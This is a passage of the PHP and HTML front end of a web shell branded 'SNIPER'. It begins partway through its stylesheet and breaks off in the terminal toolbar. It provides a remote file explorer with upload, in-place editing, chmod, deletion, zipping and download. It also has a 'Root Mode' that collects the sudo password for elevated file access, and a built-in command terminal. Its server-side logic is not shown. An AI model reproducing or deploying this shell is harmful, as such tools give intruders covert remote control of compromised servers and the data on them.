            white-space: nowrap;
        }
        .directory-item:hover .item-actions {
            opacity: 1;
            pointer-events: auto;
        }
        .ia-btn {
            cursor: pointer;
            font-size: 0.8rem;
            color: var(--muted);
            transition: color .15s, transform .15s;
            padding: 2px;
        }
        .ia-btn:hover { color: var(--cyan); transform: scale(1.2); }
        .ia-danger:hover { color: var(--primary); }

        /* ===== Modal file ops row + image preview ===== */
        .modal-fileops {
            display: flex;
            gap: 8px;
            align-items: center;
            padding: 8px 22px;
            border-bottom: 1px solid var(--border);
            background: rgba(0,0,0,.25);
            flex-wrap: wrap;
            flex-shrink: 0;
        }
        .mfo-label { font-size: .75rem; color: var(--muted); letter-spacing: 1px; }
        .modal-fileops .btn-small { padding: 5px 10px; font-size: .72rem; }
        .ia-danger-bg { background: rgba(255,0,51,.15) !important; border-color: rgba(255,0,51,.4) !important; color: var(--accent) !important; }
        .modal-img-wrap {
            flex-grow: 1;
            display: flex;
            align-items: center;
            justify-content: center;
            background:
                repeating-conic-gradient(#111 0% 25%, #181818 0% 50%) 0 / 24px 24px;
            padding: 20px;
            min-height: 200px;
        }
        #modalImg { max-width: 100%; max-height: 100%; object-fit: contain; border-radius: 4px; }

        /* ===== System Info tabs ===== */
        .si-tabs { display: flex; gap: 8px; flex-wrap: wrap; margin-bottom: 14px; }
        .tab-btn {
            background: var(--gray) !important;
            border: 1px solid var(--border) !important;
            color: var(--muted) !important;
            padding: 8px 14px !important;
            font-size: .82rem !important;
            border-radius: 6px;
        }
        .tab-btn.tab-active {
            border-color: var(--primary) !important;
            color: var(--primary) !important;
            background: rgba(255,0,51,.08) !important;
        }
        .tab-pane.hidden { display: none; }
        .si-pre {
            background: #080808;
            border: 1px solid var(--border);
            border-radius: 6px;
            padding: 14px 16px;
            font-family: 'Courier New', monospace;
            font-size: .78rem;
            line-height: 1.6;
            color: var(--success);
            overflow-x: auto;
            max-height: 420px;
            overflow-y: auto;
            white-space: pre;
            margin: 0;
        }
        .si-table {
            width: 100%;
            border-collapse: collapse;
            background: #080808;
            border: 1px solid var(--border);
            border-radius: 6px;
            max-height: 420px;
            display: block;
            overflow-y: auto;
        }
        .si-table td {
            padding: 5px 12px;
            font-family: 'Courier New', monospace;
            font-size: .75rem;
            color: var(--text);
            border-bottom: 1px solid #161616;
            white-space: pre;
        }
        .si-table tr:hover td { background: rgba(0,229,255,.04); color: var(--cyan); }
        .si-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
            gap: 8px;
        }

        @media (max-width: 768px) {
            .logo { font-size: 2.2rem; letter-spacing: 4px; }
            .path-container, .directory-select, .command-section { flex-direction: column; }
            select, input[type="text"], button { width: 100%; }
            .card { padding: 16px; }
            .modal-box { height: 90vh; max-width: 100%; }
            .modal-header { flex-direction: column; align-items: stretch; }
            .modal-title-group { flex-wrap: wrap; }
            .modal-meta { margin-left: 0; margin-top: 8px; }
            .modal-actions { justify-content: flex-end; margin-top: 8px; }
            .fm-controls { flex-direction: column; align-items: stretch; }
            .selbar { border-radius: 14px; }
        }

        /* ===== FM controls row (search + sort) ===== */
        .fm-controls {
            display: flex;
            align-items: center;
            gap: 10px;
            flex-wrap: wrap;
            margin: 12px 0 4px;
        }
        .search-wrap {
            display: flex;
            align-items: center;
            gap: 8px;
            background: var(--gray);
            border: 1px solid var(--border);
            border-radius: 6px;
            padding: 0 12px;
            flex-grow: 1;
            min-width: 200px;
            max-width: 340px;
        }
        .search-wrap i { color: var(--muted); font-size: .8rem; }
        .search-wrap input {
            background: transparent !important;
            border: none !important;
            outline: none;
            padding: 9px 0;
            width: 100%;
            color: var(--text);
            font-size: .85rem;
        }
        .ctl-label { font-size: .78rem; color: var(--muted); }
        .sort-btn {
            text-decoration: none;
            font-size: .8rem;
            padding: 6px 10px;
            border-radius: 5px;
            border: 1px solid var(--border);
            background: var(--gray);
            color: var(--muted);
            transition: .15s;
        }
        .sort-btn:hover { color: var(--cyan); border-color: var(--cyan); }
        .sort-active {
            color: var(--primary) !important;
            border-color: var(--primary) !important;
            background: rgba(255,0,51,.08) !important;
        }
        .item-count { font-size: .78rem; color: var(--muted); white-space: nowrap; }

        /* ===== Selection checkboxes ===== */
        .selbox { position: absolute; top: 6px; left: 6px; z-index: 5; }
        .itemCheck { width: 16px; height: 16px; accent-color: #ff0033; cursor: pointer; }
        .directory-item.sel {
            border-color: var(--primary) !important;
            background: rgba(255,0,51,.07) !important;
        }

        /* ===== Thumbnails & tile click ===== */
        .tile-click {
            cursor: pointer;
            width: 100%;
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 8px;
        }
        .thumb {
            width: 64px;
            height: 48px;
            object-fit: cover;
            border-radius: 4px;
            border: 1px solid var(--border);
            background: #000;
        }
        .dsz-link { color: var(--cyan); text-decoration: none; font-size: .65rem; }
        .dsz-link:hover { text-decoration: underline; }
        .lperms { display: none; font-family: monospace; font-size: .72rem; color: var(--muted); }

        /* ===== Pager ===== */
        .pager {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
            margin-top: 14px;
        }
        .pager a {
            color: var(--cyan);
            text-decoration: none;
            border: 1px solid var(--border);
            border-radius: 5px;
            padding: 4px 10px;
            background: var(--gray);
        }
        .pager a:hover { border-color: var(--primary); color: var(--primary); }
        .pg-info { color: var(--muted); font-size: .78rem; }

        /* ===== Floating selection bar ===== */
        .selbar {
            position: fixed;
            left: 50%;
            transform: translateX(-50%);
            bottom: 26px;
            z-index: 9000;
            display: flex;
            gap: 10px;
            align-items: center;
            background: rgba(10,10,10,.97);
            border: 1px solid var(--primary);
            border-radius: 30px;
            padding: 10px 18px;
            box-shadow: 0 6px 24px rgba(255,0,51,.25);
            flex-wrap: wrap;
            max-width: 92vw;
            justify-content: center;
        }
        .selbar strong { color: var(--primary); }

        /* ===== Dupes panel ===== */
        .dupes-panel {
            border: 1px solid var(--border);
            border-radius: 8px;
            margin-top: 12px;
            background: #0b0b0b;
            overflow: hidden;
        }
        .dp-head {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 10px 14px;
            border-bottom: 1px solid var(--border);
            color: var(--cyan);
            font-size: .85rem;
        }
        .dp-body {
            padding: 12px 14px;
            max-height: 260px;
            overflow-y: auto;
            font-size: .78rem;
            color: var(--text);
        }
        .dp-sum { color: var(--warning); margin-bottom: 8px; }
        .dp-group { border-left: 2px solid var(--primary); padding: 6px 0 6px 12px; margin-bottom: 10px; }
        .dp-gname { color: var(--accent); margin-bottom: 4px; }
        .dp-path { font-family: monospace; color: var(--muted); word-break: break-all; }

        /* ===== List view mode ===== */
        .directory-grid.list-mode {
            display: flex;
            flex-direction: column;
            gap: 4px;
        }
        .directory-grid.list-mode .directory-item {
            display: flex;
            flex-direction: row;
            align-items: center;
            text-align: left;
            padding: 7px 12px;
            gap: 12px;
        }
        .directory-grid.list-mode .selbox { position: static; }
        .directory-grid.list-mode .tile-click {
            flex-direction: row;
            flex-grow: 1;
            align-items: center;
            gap: 10px;
            width: auto;
        }
        .directory-grid.list-mode .thumb { width: 36px; height: 28px; }
        .directory-grid.list-mode .tile-ic { margin-bottom: 0; }
        .directory-grid.list-mode .fmeta { margin-top: 0; white-space: nowrap; }
        .directory-grid.list-mode .lperms { display: block; min-width: 56px; }
        .directory-grid.list-mode .item-actions {
            position: static;
            transform: none;
            opacity: 1;
            pointer-events: auto;
            border: none;
            background: transparent;
            box-shadow: none;
            padding: 0;
        }

        /* ===== Fullscreen explorer ===== */
        .card.fs-mode {
            position: fixed;
            inset: 12px;
            z-index: 9500;
            margin: 0;
            overflow: auto;
            box-shadow: 0 0 80px rgba(255,0,51,.35);
        }

        /* ===== Dropzone highlight ===== */
        .directory-grid.dropzone-on {
            outline: 2px dashed var(--primary);
            outline-offset: -6px;
            background: rgba(255,0,51,.05);
        }

        /* ===== Smaller stat values (mini cards) ===== */
        .stat-value.sm-val {
            font-size: 1.05rem;
            line-height: 1.3;
            word-break: break-word;
        }

        /* ===== Locked (unreadable) folders ===== */
        .directory-item.locked { opacity: .45; }
        .lock-badge {
            color: var(--accent);
            font-size: .75rem;
            margin-top: -4px;
        }

        /* ===== Root Mode ===== */
        .fm-btn-root {
            border-color: var(--success) !important;
            color: var(--success) !important;
            animation: rootPulse 2s infinite;
        }
        @keyframes rootPulse {
            0%, 100% { box-shadow: 0 0 0 rgba(0,255,135,0); }
            50%      { box-shadow: 0 0 12px rgba(0,255,135,.35); }
        }
        .root-chip { color: var(--success); font-weight: 700; letter-spacing: 1px; }
        .root-modal-box { max-width: 440px; height: auto !important; max-height: none !important; }
        #rootPw {
            width: 100%;
            background: #111;
            border: 1px solid var(--border);
            border-radius: 6px;
            color: var(--text);
            padding: 10px 12px;
            outline: none;
        }
        #rootPw:focus { border-color: var(--success); }

        /* ===== Single-pane Kali-style terminal ===== */
        .terminal-wrap { margin-top: 16px; }
        .terminal-toolbar {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 8px 12px;
            background: #0d1420;
            border: 1px solid var(--border);
            border-bottom: none;
            border-radius: 8px 8px 0 0;
        }
        .terminal-toolbar .tt-title {
            font-size: .82rem;
            color: var(--muted);
            letter-spacing: 1px;
        }
        .terminal-toolbar .controls { gap: 6px; }
        .terminal-toolbar .btn-small {
            background: transparent;
            color: var(--text);
            font-family: inherit;
        }

        .terminal-pane {
            display: flex;
            flex-direction: column;
            background: #0a0e14;
            border: 1px solid var(--border);
            border-radius: 0 0 8px 8px;
            min-height: 380px;
            height: 46vh;
            font-family: 'Courier New', monospace;
        }
        #termScroll {
            flex: 1;
            overflow-y: auto;
            overflow-x: hidden;
            padding: 12px 0 4px;
            white-space: pre-wrap;
            word-break: break-word;
            color: #c9d1d9;
            font-size: .88rem;
            line-height: 1.45;
        }
        #termScroll::-webkit-scrollbar { width: 8px; }
        #termScroll::-webkit-scrollbar-thumb { background: #2a3444; border-radius: 4px; }
        #termBuffer { padding: 0 14px; }
        .term-line-cmd { color: #00ff99; font-weight: bold; }
        .term-out { color: #c9d1d9; margin-bottom: 2px; }

        .term-input-line {
            display: flex;
            align-items: flex-start;
            gap: 8px;
            padding: 4px 14px 14px 14px;
            flex-shrink: 0;
        }
        .term-prompt {
            color: #ff0033;
            font-weight: bold;
            white-space: nowrap;
            font-size: .88rem;
            line-height: 1.5;
            user-select: none;
            cursor: default;
        }
        #termCmd {
            flex: 1;
            min-height: 0;
            width: auto;
            height: auto;
            background: transparent;
            border: none;
            outline: none;
            resize: none;
            overflow-x: hidden;
            padding: 0;
            color: #ffffff;
            caret-color: #00ff99;
            font-family: 'Courier New', monospace;
            font-size: .88rem;
            line-height: 1.5;
            max-height: 160px;
            overflow-y: auto;
            white-space: pre-wrap;
        }
        #termCmd::placeholder { color: #55637a; }

        .terminal-pane.term-tall { height: 78vh; min-height: 500px; }
        .terminal-pane.term-max {
            position: fixed;
            inset: 16px;
            z-index: 9600;
            height: auto;
            min-height: 0;
            box-shadow: 0 0 70px rgba(255, 0, 51, .35);
        }
    </style>
</head>
<body>
    <canvas class="matrix-bg" id="matrixCanvas"></canvas>

    <!-- ===== Root Mode Modal ===== -->
    <div id="rootModal" class="modal-overlay">
        <div class="modal-box root-modal-box">
            <div class="modal-header">
                <div class="modal-title-group">
                    <i class="fas fa-user-shield"></i>
                    <div>
                        <div class="modal-file-name">Root Mode</div>
                        <div style="font-size:.72rem;color:var(--muted);margin-top:2px;">Elevated file operations via sudo</div>
                    </div>
                </div>
                <button type="button" class="btn-small close-modal" onclick="document.getElementById('rootModal').classList.remove('active')">&times;</button>
            </div>
            <div style="padding:18px 22px;">
                <div style="font-size:.8rem;color:var(--muted);margin-bottom:12px;">
                    Enter the sudo password to unlock root powers for browsing,
                    viewing, downloading and modifying protected files.
                    Auto-locks after 30 minutes of inactivity.
                </div>
                <input type="password" id="rootPw" placeholder="sudo password" autocomplete="off"
                       onkeydown="if(event.key==='Enter'){event.preventDefault();jsRootUnlock();}">
                <div style="display:flex;gap:10px;margin-top:14px;">
                    <button type="button" class="btn-small" onclick="jsRootUnlock()" style="border-color:var(--primary);color:var(--primary);">
                        <i class="fas fa-unlock"></i> Unlock
                    </button>
                    <?php if (rootModeOn()): ?>
                    <button type="button" class="btn-small" onclick="jsRootLock()">
                        <i class="fas fa-lock"></i> Lock Now
                    </button>
                    <?php endif; ?>
                </div>
            </div>
        </div>
    </div>

    <!-- ===== Root Mode submit form ===== -->
    <form method="post" id="rootForm" style="display:none;">
        <input type="hidden" name="root_op" id="rootOpF">
        <input type="hidden" name="root_password" id="rootPwF">
        <input type="hidden" name="work_dir" value="<?php echo htmlspecialchars($work_dir); ?>">
    </form>

    <!-- ===== File Viewer Modal ===== -->
    <div id="fileModal" class="modal-overlay">
        <div class="modal-box">
            <div class="modal-header">
                <div class="modal-title-group">
                    <i class="fas fa-file-code"></i>
                    <div>
                        <div class="modal-file-name" id="modalFileName">&mdash;</div>
                        <div style="font-size:0.72rem;color:var(--muted);margin-top:2px;" id="modalFilePath"></div>
                    </div>
                </div>
                <div class="modal-meta">
                    <span id="modalFileSize"></span>
                    <span>&middot;</span>
                    <span id="modalFilePerms"></span>
                </div>
                <div class="modal-actions">
                    <button type="button" class="btn-small" onclick="startEditFile()" id="btnEdit">
                        <i class="fas fa-pen"></i> Edit
                    </button>
                    <button type="button" class="btn-small" onclick="downloadCurrentFile()">
                        <i class="fas fa-download"></i> Download
                    </button>
                    <button type="button" class="btn-small" onclick="togglePermPanel()">
                        <i class="fas fa-lock"></i> Perms
                    </button>
                    <button type="button" class="btn-small" onclick="copyFileContent()">
                        <i class="fas fa-copy"></i> Copy
                    </button>
                    <button type="button" class="btn-small close-modal" onclick="closeFileModal()">
                        <i class="fas fa-times"></i> Close
                    </button>
                </div>
            </div>

            <!-- Quick file operations row -->
            <div class="modal-fileops">
                <span class="mfo-label"><i class="fas fa-tools"></i> Ops:</span>
                <button type="button" class="btn-small" onclick="jsRename(fileData.path, fileData.name)"><i class="fas fa-pen"></i> Rename</button>
                <button type="button" class="btn-small" onclick="jsCopyMove('copy')"><i class="fas fa-clone"></i> Copy</button>
                <button type="button" class="btn-small" onclick="jsCopyMove('move')"><i class="fas fa-arrows-alt"></i> Move</button>
                <button type="button" class="btn-small" onclick="jsOp('zip', fileData.path)"><i class="fas fa-archive"></i> Zip</button>
                <button type="button" class="btn-small ia-danger-bg" onclick="jsDelete(fileData.path, false, true)"><i class="fas fa-trash"></i> Delete</button>
            </div>

            <!-- Edit mode banner (hidden by default) -->
            <div class="edit-toolbar" id="editToolbar" style="display:none;">
                <span><i class="fas fa-circle" style="font-size:0.5rem;color:var(--warning);"></i> EDIT MODE &mdash; editing <b id="editFileNameLabel"></b></span>
                <span style="color:var(--muted);">Ctrl+S to save</span>
            </div>

            <?php if ($save_status): ?>
            <div class="status-flash status-<?php echo $save_status; ?>">
                <i class="fas fa-<?php echo $save_status === 'success' ? 'check-circle' : 'exclamation-triangle'; ?>"></i>
                <?php echo htmlspecialchars($save_message); ?>
            </div>
            <?php endif; ?>
            <?php if ($chmod_status): ?>
            <div class="status-flash status-<?php echo $chmod_status; ?>">
                <i class="fas fa-<?php echo $chmod_status === 'success' ? 'check-circle' : 'exclamation-triangle'; ?>"></i>
                <?php echo htmlspecialchars($chmod_message); ?>
            </div>
            <?php endif; ?>

            <!-- Permissions panel (hidden by default) -->
            <div class="perm-panel" id="permPanel" style="display:none;">
                <h4><i class="fas fa-shield-alt"></i> Permission Details</h4>
                <div class="perm-grid" id="permGrid"></div>
                <form method="post" class="perm-form" onsubmit="syncChmodPath(this)">
                    <input type="hidden" name="work_dir" value="<?php echo htmlspecialchars($work_dir); ?>">
                    <input type="hidden" name="view_file_reopen" id="chmodViewReopen" value="">
                    <input type="hidden" name="chmod_path" id="chmodPathInput" value="">
                    <label for="chmodValue">Change to octal:</label>
                    <input type="text" name="chmod_value" id="chmodValue" placeholder="e.g. 644" maxlength="4" pattern="[0-7]{3,4}" required>
                    <button type="submit" name="chmod_action" value="1" class="btn-chmod"><i class="fas fa-key"></i> Apply chmod</button>
                </form>
            </div>

            <div class="modal-body">
                <div class="modal-img-wrap" id="modalImgWrap" style="display:none;">
                    <img id="modalImg" alt="preview">
                </div>
                <pre class="modal-content-area" id="modalContent">// No file loaded</pre>

                <!-- Edit form lives INSIDE modal-body so textarea fills the space -->
                <form method="post" id="saveForm" class="edit-form" style="display:none;">
                    <input type="hidden" name="edit_path" id="editPathInput" value="">
                    <input type="hidden" name="work_dir" value="<?php echo htmlspecialchars($work_dir); ?>">
                    <textarea name="file_content" id="editTextarea" class="modal-content-area editing" spellcheck="false"></textarea>
                    <div class="edit-actions">
                        <button type="button" class="btn-cancel" onclick="cancelEdit()"><i class="fas fa-times"></i> Cancel</button>
                        <button type="submit" name="save_file_action" value="1" class="btn-save"><i class="fas fa-save"></i> Save to disk</button>
                    </div>
                </form>
            </div>
            <div class="modal-footer">
                <span><i class="fas fa-info-circle"></i> ESC close &middot; Edit saves directly to disk</span>
                <span id="modalLineCount"></span>
            </div>
        </div>
    </div>

    <!-- Hidden form for POST-based view reopen after save/chmod -->
    <form method="get" id="reopenForm" style="display:none;">
        <input type="hidden" name="work_dir" value="<?php echo htmlspecialchars($work_dir); ?>">
        <input type="hidden" name="view_file" id="reopenViewPath" value="">
    </form>

    <div class="container">
        <?php if ($flash): ?>
        <div class="flash-bar flash-<?php echo $flash['type']; ?>">
            <i class="fas fa-<?php echo $flash['type'] === 'success' ? 'check-circle' : 'exclamation-triangle'; ?>"></i>
            <?php echo htmlspecialchars($flash['message']); ?>
            <button type="button" onclick="this.parentElement.remove()">&times;</button>
        </div>
        <?php endif; ?>

        <!-- Hidden universal ops form (JS fills and submits) -->
        <form method="post" id="opsForm" style="display:none;">
            <input type="hidden" name="work_dir" value="<?php echo htmlspecialchars($work_dir); ?>">
            <input type="hidden" name="file_op" id="opsField_op">
            <input type="hidden" name="target" id="opsField_target">
            <input type="hidden" name="dest" id="opsField_dest">
        </form>

        <!-- Batch operations form -->
        <form method="post" id="batchForm" style="display:none;">
            <input type="hidden" name="work_dir" value="<?php echo htmlspecialchars($work_dir); ?>">
            <input type="hidden" name="file_op" id="bfOp">
            <input type="hidden" name="targets_json" id="bfJson">
        </form>

        <!-- Floating selection bar -->
        <div class="selbar" id="selBar" style="display:none;">
            <i class="fas fa-check-double" style="color:var(--primary);"></i>
            <strong id="selCountN">0</strong>&nbsp;selected
            <button type="button" class="btn-small ia-danger-bg" onclick="batchDeleteSelected()"><i class="fas fa-trash"></i> Delete</button>
            <button type="button" class="btn-small" onclick="batchZipSelected()"><i class="fas fa-archive"></i> Zip &amp; Download</button>
            <button type="button" class="btn-small close-modal" onclick="clearSelection()">Clear</button>
        </div>

        <div class="top-bar">
            <a href="?logout=1" class="logout-btn"><i class="fas fa-sign-out-alt"></i> Logout</a>
        </div>

        <header>
            <div class="logo">SNIPER</div>
            <div class="subtitle"><?php echo SHELL_VERSION; ?> · Advanced Terminal Interface<?php if (rootModeOn()): ?> &middot; <span class="root-chip"><i class="fas fa-user-shield"></i> ROOT MODE</span><?php endif; ?></div>
        </header>

        <div class="grid-container">
            <!-- File Explorer -->
            <div class="card" id="explorerCard">
                <h2 class="card-title"><i class="fas fa-folder-open"></i> File Explorer</h2>

                <div class="path-container">
                    <strong style="color:var(--muted);font-size:0.9rem;">Path</strong>
                    <div class="current-path"><?php echo htmlspecialchars($work_dir); ?></div>
                </div>

                <div class="path-container">
                    <div class="breadcrumb">
                        <?php
                        $path_parts = explode('/', trim($work_dir, '/'));
                        $path_accum = '';
                        echo '<a href="#" onclick="changeDir(\'/\')">Root</a>';
                        foreach ($path_parts as $part) {
                            if ($part === '') continue;
                            $path_accum .= '/' . $part;
                            echo '<span style="color:#444">/</span><a href="#" onclick="changeDir(\'' . htmlspecialchars($path_accum) . '\')">' . htmlspecialchars($part) . '</a>';
                        }
                        ?>
                    </div>
                </div>

                <div class="directory-select">
                    <select id="dirSelect">
                        <?php
                        $dirs = array_filter(glob('*') ?: [], 'is_dir');
                        array_unshift($dirs, '.');
                        if ($work_dir !== '/') array_unshift($dirs, '..');
                        foreach ($dirs as $dir) {
                            $selected = ($dir === '.') ? 'selected' : '';
                            $dir_path = ($dir === '.') ? $work_dir : (($dir === '..') ? dirname($work_dir) : $work_dir . '/' . $dir);
                            echo '<option value="' . htmlspecialchars($dir_path) . '" ' . $selected . '>' . htmlspecialchars($dir) . '</option>';
                        }
                        ?>
                    </select>
                    <button type="button" onclick="handleDirChange()"><i class="fas fa-sync-alt"></i> Go</button>
                </div>

                <div class="fm-toolbar">
                    <form method="post" enctype="multipart/form-data" class="fm-upload" id="uploadForm">
                        <input type="hidden" name="up_work_dir" value="<?php echo htmlspecialchars($work_dir); ?>">
                        <label class="fm-btn" for="upload_input"><i class="fas fa-cloud-upload-alt"></i> Upload</label>
                        <input type="file" name="upload_input[]" id="upload_input" multiple style="display:none;" onchange="document.getElementById('uploadForm').submit()">
                    </form>
                    <button type="button" class="fm-btn" onclick="jsNew('newfile')"><i class="fas fa-file-medical"></i> New File</button>
                    <button type="button" class="fm-btn" onclick="jsNew('newfolder')"><i class="fas fa-folder-plus"></i> New Folder</button>
                    <button type="button" class="fm-btn <?php echo rootModeOn() ? 'fm-btn-root' : ''; ?>" id="rootBtn" onclick="jsRootClick()" title="Elevated operations via sudo">
                        <i class="fas fa-user-shield"></i> <span id="rootLbl"><?php echo rootModeOn() ? 'ROOT ON' : 'Root Mode'; ?></span>
                    </button>
                    <span style="flex:1;"></span>
                    <?php
                    $qbase = function(array $over) use ($work_dir, $sort_by, $sort_dir, $show_hidden) {
                        return '?' . http_build_query(array_merge([
                            'work_dir' => $work_dir,
                            'sort' => $sort_by,
                            'dir' => $sort_dir === SORT_ASC ? 'asc' : 'desc',
                            'show_hidden' => $show_hidden ? '1' : '0',
                            'page' => 1,
                        ], $over));
                    };
                    ?>
                    <a class="fm-btn <?php echo !$show_hidden ? '' : 'fm-on'; ?>" href="<?php echo $qbase(['show_hidden' => $show_hidden ? '0' : '1']); ?>" title="Toggle hidden files">
                        <i class="fas fa-<?php echo $show_hidden ? 'eye-slash' : 'eye'; ?>"></i> Hidden
                    </a>
                    <button type="button" class="fm-btn" id="viewToggle" onclick="jsToggleView()"><i class="fas fa-list"></i> View</button>
                    <button type="button" class="fm-btn" onclick="jsDupes()"><i class="fas fa-clone"></i> Duplicates</button>
                    <label class="fm-btn" title="Select all on this page"><input type="checkbox" id="selectAllChk" style="accent-color:#ff0033;"> All</label>
                    <button type="button" class="fm-btn" onclick="jsFs()" title="Fullscreen"><i class="fas fa-expand"></i></button>
                </div>

                <!-- Search + sort controls -->
                <div class="fm-controls">
                    <div class="search-wrap">
                        <i class="fas fa-search"></i>
                        <input type="text" id="searchBox" placeholder="Filter by name..." autocomplete="off">
                    </div>
                    <span class="ctl-label">Sort:</span>
                    <a class="sort-btn <?php echo $sort_by==='name'?'sort-active':''; ?>" href="<?php echo $qbase(['sort'=>'name','dir'=>$sort_by==='name'?($sort_dir===SORT_ASC?'desc':'asc'):'asc']); ?>">
                        Name <?php if($sort_by==='name') echo $sort_dir===SORT_ASC?'▲':'▼'; ?>
                    </a>
                    <a class="sort-btn <?php echo $sort_by==='size'?'sort-active':''; ?>" href="<?php echo $qbase(['sort'=>'size','dir'=>$sort_by==='size'?($sort_dir===SORT_ASC?'desc':'asc'):'asc']); ?>">
                        Size <?php if($sort_by==='size') echo $sort_dir===SORT_ASC?'▲':'▼'; ?>
                    </a>
                    <a class="sort-btn <?php echo $sort_by==='date'?'sort-active':''; ?>" href="<?php echo $qbase(['sort'=>'date','dir'=>$sort_by==='date'?($sort_dir===SORT_ASC?'desc':'asc'):'asc']); ?>">
                        Date <?php if($sort_by==='date') echo $sort_dir===SORT_ASC?'▲':'▼'; ?>
                    </a>
                    <span style="flex:1;"></span>
                    <span class="item-count" id="itemCount"><?php echo $scan_denied ? '⚠ permission denied' : (count($directories) . ' dirs · ' . $total_files . ' files'); ?></span>
                </div>

                <!-- Duplicate finder results -->
                <div id="dupesPanel" class="dupes-panel" style="display:none;">
                    <div class="dp-head">
                        <strong><i class="fas fa-clone"></i> Duplicate Files (name+size match)</strong>
                        <button type="button" class="btn-small close-modal" onclick="document.getElementById('dupesPanel').style.display='none'">&times;</button>
                    </div>
                    <div id="dupeResults" class="dp-body">Scanning...</div>
                </div>

                <div class="directory-grid list-mode-off" id="directoryGrid">
                    <?php foreach ($directories as $dir): ?>
                    <div class="directory-item folder <?php echo (empty($dir['readable']) && !rootModeOn()) ? 'locked' : ''; ?>" data-name="<?php echo htmlspecialchars(strtolower($dir['name'])); ?>">
                        <label class="selbox" onclick="event.stopPropagation()"><input type="checkbox" class="itemCheck" data-path="<?php echo htmlspecialchars($dir['path'], ENT_QUOTES); ?>"></label>
                        <div class="tile-click" onclick="changeDir('<?php echo htmlspecialchars($dir['path'], ENT_QUOTES); ?>')">
                            <i class="fas fa-folder tile-ic"></i>
                            <?php if (empty($dir['readable']) && !rootModeOn()): ?><i class="fas fa-lock lock-badge" title="No read permission"></i><?php endif; ?>
                            <div class="name"><?php echo htmlspecialchars($dir['name']); ?></div>
                        </div>
                        <div class="fmeta">
                            <span class="dsize" data-path="<?php echo htmlspecialchars($dir['path'], ENT_QUOTES); ?>">folder</span>
                            · <?php echo date('d M H:i', (int)$dir['mtime']); ?>
                            · <a href="#" class="dsz-link" data-ds="<?php echo htmlspecialchars($dir['path'], ENT_QUOTES); ?>" onclick="event.preventDefault();jsDirSize(this)">[size]</a>
                        </div>
                        <div class="lperms"><?php echo htmlspecialchars($dir['perms']); ?></div>
                        <div class="item-actions" onclick="event.stopPropagation()">
                            <i class="fas fa-pen ia-btn" title="Rename" onclick="jsRename('<?php echo htmlspecialchars($dir['path'], ENT_QUOTES); ?>','<?php echo htmlspecialchars($dir['name'], ENT_QUOTES); ?>')"></i>
                            <i class="fas fa-archive ia-btn" title="Zip" onclick="jsOp('zip','<?php echo htmlspecialchars($dir['path'], ENT_QUOTES); ?>')"></i>
                            <i class="fas fa-trash ia-btn ia-danger" title="Delete" onclick="jsDelete('<?php echo htmlspecialchars($dir['path'], ENT_QUOTES); ?>', true)"></i>
                        </div>
                    </div>
                    <?php endforeach; ?>
                    <?php foreach ($files_page as $file): ?>
                    <div class="directory-item file" data-name="<?php echo htmlspecialchars(strtolower($file['name'])); ?>">
                        <label class="selbox" onclick="event.stopPropagation()"><input type="checkbox" class="itemCheck" data-path="<?php echo htmlspecialchars($file['path'], ENT_QUOTES); ?>"></label>
                        <div class="tile-click" onclick="openFileViewer('<?php echo htmlspecialchars($file['path'], ENT_QUOTES); ?>')">
                            <?php if ($file['isimg']): ?>
                            <img class="thumb" loading="lazy" src="?raw_file=<?php echo urlencode($file['path']); ?>&t=<?php echo (int)$file['mtime']; ?>" alt="" onerror="this.style.display='none';this.nextElementSibling.style.display='block';">
                            <i class="fas fa-file-image tile-ic" style="display:none;"></i>
                            <?php else: ?>
                            <i class="fas <?php echo $file['iszip'] ? 'fa-file-archive' : 'fa-file'; ?> tile-ic"></i>
                            <?php endif; ?>
                            <div class="name"><?php echo htmlspecialchars($file['name']); ?></div>
                        </div>
                        <div class="fmeta"><?php echo formatBytes((int)$file['size']) . ' · ' . date('d M H:i', (int)$file['mtime']); ?></div>
                        <div class="lperms"><?php echo htmlspecialchars($file['perms']) . ($file['writable'] ? ' w' : ''); ?></div>
                        <div class="item-actions" onclick="event.stopPropagation()">
                            <i class="fas fa-download ia-btn" title="Download" onclick="jsDownload('<?php echo htmlspecialchars($file['path'], ENT_QUOTES); ?>')"></i>
                            <i class="fas fa-pen ia-btn" title="Rename" onclick="jsRename('<?php echo htmlspecialchars($file['path'], ENT_QUOTES); ?>','<?php echo htmlspecialchars($file['name'], ENT_QUOTES); ?>')"></i>
                            <?php if ($file['iszip']): ?>
                            <i class="fas fa-box-open ia-btn" title="Unzip here" onclick="jsOp('unzip','<?php echo htmlspecialchars($file['path'], ENT_QUOTES); ?>')"></i>
                            <?php endif; ?>
                            <i class="fas fa-trash ia-btn ia-danger" title="Delete" onclick="jsDelete('<?php echo htmlspecialchars($file['path'], ENT_QUOTES); ?>', false)"></i>
                        </div>
                    </div>
                    <?php endforeach; ?>
                </div>

                <?php if ($total_pages > 1): ?>
                <div class="pager">
                    <?php if ($page > 1): ?><a href="<?php echo $qbase(['page' => 1]); ?>">&laquo;</a><a href="<?php echo $qbase(['page' => $page - 1]); ?>">&lsaquo;</a><?php endif; ?>
                    <span class="pg-info">Page <?php echo $page; ?>/<?php echo $total_pages; ?> · <?php echo $total_files; ?> files</span>
                    <?php if ($page < $total_pages): ?><a href="<?php echo $qbase(['page' => $page + 1]); ?>">&rsaquo;</a><a href="<?php echo $qbase(['page' => $total_pages]); ?>">&raquo;</a><?php endif; ?>
                </div>
                <?php endif; ?>
            </div>

            <!-- Command Center -->
            <div class="card">
                <h2 class="card-title"><i class="fas fa-terminal"></i> Command Center</h2>

                <form id="commandForm" method="get">
                    <input type="hidden" name="work_dir" id="workDirInput" value="<?php echo htmlspecialchars($work_dir); ?>">
                    <input type="hidden" name="view_file" id="viewFileInput" value="">
                </form>

                <div class="terminal-wrap" id="terminalWrap">
                    <div class="terminal-toolbar">
                        <span class="tt-title"><i class="fas fa-terminal"></i> SNIPER TERMINAL</span>
                        <div class="controls">
                            <button type="button" class="btn-small" onclick="termFont(-1)" title="Smaller text">A-</button>
                            <button type="button" class="btn-small" onclick="termFont(1)" title="Bigger text">A+</button>
                            <button type="button" class="btn-small" id="termSizeBtn" onclick="termCycle()" title="Size: normal / tall / fullscreen (ESC = exit)"></button>
                            <button type="button" class="btn-small" onclick="termClear()" title="Clear screen"><i class="fas fa-trash-alt"></i></button>
